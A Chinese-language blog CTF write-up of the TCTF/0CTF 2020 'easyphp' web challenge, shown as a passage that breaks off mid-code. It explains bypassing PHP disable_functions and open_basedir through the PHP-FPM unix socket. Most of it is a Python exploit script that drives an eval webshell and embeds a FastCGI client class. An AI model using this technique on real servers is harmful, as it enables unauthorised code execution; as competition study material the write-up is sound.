<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>TCTF/0CTF 2020 Writeup - rmb122's notebook</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="又是一年 0CTF, 这次一个人一队单刷一次, 做出了两题 WEB, 可惜只输出了一天, 第二天还要赶 ddl, 还是太蔡了 orz"><meta property="og:image" content><meta property="og:title" content="TCTF/0CTF 2020 Writeup"><meta property="og:description" content="又是一年 0CTF, 这次一个人一队单刷一次, 做出了两题 WEB, 可惜只输出了一天, 第二天还要赶 ddl, 还是太蔡了 orz"><meta property="og:type" content="article"><meta property="og:url" content="https://rmb122.com/2020/06/29/TCTF-0CTF-2020-Writeup/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-06-29T19:49:05+00:00"><meta property="article:modified_time" content="2020-06-29T19:49:05+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="TCTF/0CTF 2020 Writeup"><meta name=twitter:description content="又是一年 0CTF, 这次一个人一队单刷一次, 做出了两题 WEB, 可惜只输出了一天, 第二天还要赶 ddl, 还是太蔡了 orz"><script src=https://rmb122.com/js/feather.min.js></script>
<link rel=stylesheet type=text/css media=screen href=https://rmb122.com/css/main.adee9cfbd354daaeb33dace537964a63d82b2251776e6faa9b2b77ed0860ce11.css><link id=darkModeStyle rel=stylesheet type=text/css href=https://rmb122.com/css/dark.edf79541ec4ce8eb7c41e94c73563068c3e0a2637547bb1abb19618cb525a38d.css disabled></head><body><div class=content><header><div class=main><a href=https://rmb122.com/>rmb122's notebook</a></div><nav><a href=/>首页</a>&nbsp;
<a href=/posts>归档</a>&nbsp;
<a href=/tags>标签</a>&nbsp;
<a href=/links>友链</a>&nbsp;
<a href=/about>关于</a>
| <a id=dark-mode-toggle onclick=toggleTheme() href></a>
<script src=https://rmb122.com/js/themetoggle.js></script></nav></header><main><article><div class=title><h1 class=title>TCTF/0CTF 2020 Writeup</h1><div class=meta>发表于 2020 年 6 月 29 日</div></div><section class=body><p>又是一年 0CTF, 这次一个人一队单刷一次, 做出了两题 WEB, 可惜只输出了一天, 第二天还要赶 ddl, 还是太蔡了 orz</p><h2 id=easyphp>easyphp</h2><p>直接给了 webshell, 看 phpinfo,</p><p>disable_functions:
set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl<br>open_basedir: /var/www/html<br>disable_classes: ReflectionClass<br>Server API: FPM/FastCGI</p><p>看样子是需要 rce, 有 disable_functions 和 open_basedir 的限制, 这里可以看到用的是 fpm 而且 fsockopen 没有限制, 可以想到直接打 fcgi, 不过需要知道 unix socket 的路径, 这里可以用 DirectoryIterator 来列目录, 不过试了下只能列根目录, 其他地方还是会被 open_basedir 拦, 比较神奇. 不过好在 fuzz 了一下, 是个常见未知, 在 <code>unix:///var/run/php-fpm.sock</code>.<br>之后就不用多说了, 用 PHP_VALUE 里面的 open_basedir 覆盖掉 php.ini 里的 open_basedir 即可.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#ff79c6>import</span> requests
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sess <span style=color:#ff79c6>=</span> requests<span style=color:#ff79c6>.</span>session()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>execute_php_code</span>(s):
</span></span><span style=display:flex><span>    res <span style=color:#ff79c6>=</span> sess<span style=color:#ff79c6>.</span>post(<span style=color:#f1fa8c>&#39;http://pwnable.org:19260/?rh=eval($_POST[a]);&#39;</span>, data<span style=color:#ff79c6>=</span>{<span style=color:#f1fa8c>&#34;a&#34;</span>: s})
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> res<span style=color:#ff79c6>.</span>text
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>code <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>class AA
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>{
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    const VERSION_1            = 1;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    const BEGIN_REQUEST        = 1;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    const ABORT_REQUEST        = 2;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    const END_REQUEST          = 3;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    const PARAMS               = 4;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    const STDIN                = 5;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    const STDOUT               = 6;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    const STDERR               = 7;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    const DATA                 = 8;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    const GET_VALUES           = 9;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    const GET_VALUES_RESULT    = 10;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    const UNKNOWN_TYPE         = 11;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    const MAXTYPE              = self::UNKNOWN_TYPE;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    const RESPONDER            = 1;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    const AUTHORIZER           = 2;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    const FILTER               = 3;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    const REQUEST_COMPLETE     = 0;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    const CANT_MPX_CONN        = 1;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    const OVERLOADED           = 2;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    const UNKNOWN_ROLE         = 3;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    const MAX_CONNS            = &#39;MAX_CONNS&#39;;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    const MAX_REQS             = &#39;MAX_REQS&#39;;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    const MPXS_CONNS           = &#39;MPXS_CONNS&#39;;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    const HEADER_LEN           = 8;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    /**
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * Socket
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * @var Resource
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    private $_sock = null;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    /**
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * Host
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * @var String
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    private $_host = null;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    /**
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * Port
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * @var Integer
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    private $_port = null;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    /**
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * Keep Alive
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * @var Boolean
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    private $_keepAlive = false;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    /**
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * Constructor
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     *
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * @param String $host Host of the FastCGI application
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * @param Integer $port Port of the FastCGI application
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        $this-&gt;_host = $host;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        $this-&gt;_port = $port;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    /**
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * Define whether or not the FastCGI application should keep the connection
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * alive at the end of a request
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     *
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * @param Boolean $b true if the connection should stay alive, false otherwise
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    public function setKeepAlive($b)
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        $this-&gt;_keepAlive = (boolean)$b;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            fclose($this-&gt;_sock);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    /**
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * Get the keep alive status
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     *
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * @return Boolean true if the connection should stay alive, false otherwise
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    public function getKeepAlive()
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        return $this-&gt;_keepAlive;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    /**
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * Create a connection to the FastCGI application
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    private function connect()
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        if (!$this-&gt;_sock) {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            $this-&gt;_sock = fsockopen($this-&gt;_host);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            var_dump($this-&gt;_sock);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            if (!$this-&gt;_sock) {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                throw new Exception(&#39;Unable to connect to FastCGI application&#39;);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    /**
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * Build a FastCGI packet
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     *
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * @param Integer $type Type of the packet
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * @param String $content Content of the packet
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * @param Integer $requestId RequestId
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    private function buildPacket($type, $content, $requestId = 1)
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        $clen = strlen($content);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        return chr(self::VERSION_1)         /* version */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            . chr($type)                    /* type */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            . chr($requestId &amp; 0xFF)        /* requestIdB0 */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            . chr(($clen &gt;&gt; 8 ) &amp; 0xFF)     /* contentLengthB1 */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            . chr($clen &amp; 0xFF)             /* contentLengthB0 */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            . chr(0)                        /* paddingLength */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            . chr(0)                        /* reserved */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            . $content;                     /* content */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    /**
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * Build an FastCGI Name value pair
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     *
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * @param String $name Name
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * @param String $value Value
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * @return String FastCGI Name value pair
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    private function buildNvpair($name, $value)
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        $nlen = strlen($name);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        $vlen = strlen($value);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        if ($nlen &lt; 128) {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            /* nameLengthB0 */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            $nvpair = chr($nlen);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        } else {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        if ($vlen &lt; 128) {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            /* valueLengthB0 */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            $nvpair .= chr($vlen);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        } else {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        /* nameData &amp; valueData */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        return $nvpair . $name . $value;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    /**
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * Read a set of FastCGI Name value pairs
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     *
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * @param String $data Data containing the set of FastCGI NVPair
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * @return array of NVPair
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    private function readNvpair($data, $length = null)
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        $array = array();
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        if ($length === null) {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            $length = strlen($data);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        $p = 0;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        while ($p != $length) {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            $nlen = ord($data{$p++});
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            if ($nlen &gt;= 128) {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                $nlen = ($nlen &amp; 0x7F &lt;&lt; 24);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                $nlen |= (ord($data{$p++}) &lt;&lt; 16);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                $nlen |= (ord($data{$p++}) &lt;&lt; 8);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                $nlen |= (ord($data{$p++}));
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            $vlen = ord($data{$p++});
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            if ($vlen &gt;= 128) {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                $vlen = ($nlen &amp; 0x7F &lt;&lt; 24);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                $vlen |= (ord($data{$p++}) &lt;&lt; 16);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                $vlen |= (ord($data{$p++}) &lt;&lt; 8);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                $vlen |= (ord($data{$p++}));
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            $p += ($nlen + $vlen);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        return $array;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    /**
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * Decode a FastCGI Packet
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     *
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * @param String $data String containing all the packet
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * @return array
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    private function decodePacketHeader($data)
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        $ret = array();
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        $ret[&#39;version&#39;]       = ord($data</span><span style=color:#f1fa8c>{0}</span><span style=color:#f1fa8c>);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        $ret[&#39;type&#39;]          = ord($data</span><span style=color:#f1fa8c>{1}</span><span style=color:#f1fa8c>);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        $ret[&#39;requestId&#39;]     = (ord($data</span><span style=color:#f1fa8c>{2}</span><span style=color:#f1fa8c>) &lt;&lt; 8) + ord($data</span><span style=color:#f1fa8c>{3}</span><span style=color:#f1fa8c>);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        $ret[&#39;contentLength&#39;] = (ord($data</span><span style=color:#f1fa8c>{4}</span><span style=color:#f1fa8c>) &lt;&lt; 8) + ord($data</span><span style=color:#f1fa8c>{5}</span><span style=color:#f1fa8c>);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        $ret[&#39;paddingLength&#39;] = ord($data</span><span style=color:#f1fa8c>{6}</span><span style=color:#f1fa8c>);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        $ret[&#39;reserved&#39;]      = ord($data</span><span style=color:#f1fa8c>{7}</span><span style=color:#f1fa8c>);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        return $ret;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    /**
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * Read a FastCGI Packet
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     *
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * @return array
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    private function readPacket()
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            $resp = $this-&gt;decodePacketHeader($packet);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            $resp[&#39;content&#39;] = &#39;&#39;;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            if ($resp[&#39;contentLength&#39;]) {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                $len  = $resp[&#39;contentLength&#39;];
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                while ($len &amp;&amp; $buf=fread($this-&gt;_sock, $len)) {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                    $len -= strlen($buf);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                    $resp[&#39;content&#39;] .= $buf;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            if ($resp[&#39;paddingLength&#39;]) {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                $buf=fread($this-&gt;_sock, $resp[&#39;paddingLength&#39;]);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            return $resp;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        } else {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            return false;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    /**
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * Get Informations on the FastCGI application
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     *
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * @param array $requestedInfo information to retrieve
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     * @return array
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>     */
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    public function getValues(array $requestedInfo)
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        $this-&gt;connect();
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        $request = &#39;&#39;;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        foreach ($requestedInfo as $info) {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            $request .= $this-&gt;buildNvpair($info, &#39;&#39;);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0));
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        $resp = $this-&gt;readPacket();
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        if ($resp[&#39;type&#39;] == self::GET_VALUES_RESULT) {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            return $this-&gt;readNvpair($resp[&#39;content&#39;], $resp[&#39;length&#39;]);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        } else {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            throw new Exception(&#39;Unexpected response type, expecting GET_VALUES_RESULT&#39;);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    public function request(array $params, $stdin)
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        $response = &#39;&#39;;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        $this-&gt;connect();
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_repeat(chr(0), 5));
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        $paramsRequest = &#39;&#39;;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        foreach ($params as $key =&gt; $value) {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            $paramsRequest .= $this-&gt;buildNvpair($key, $value);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        if ($paramsRequest) {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        $request .= $this-&gt;buildPacket(self::PARAMS, &#39;&#39;);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        if ($stdin) {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            $request .= $this-&gt;buildPacket(self::STDIN, $stdin);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        $request .= $this-&gt;buildPacket(self::STDIN, &#39;&#39;);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        fwrite($this-&gt;_sock, $request);
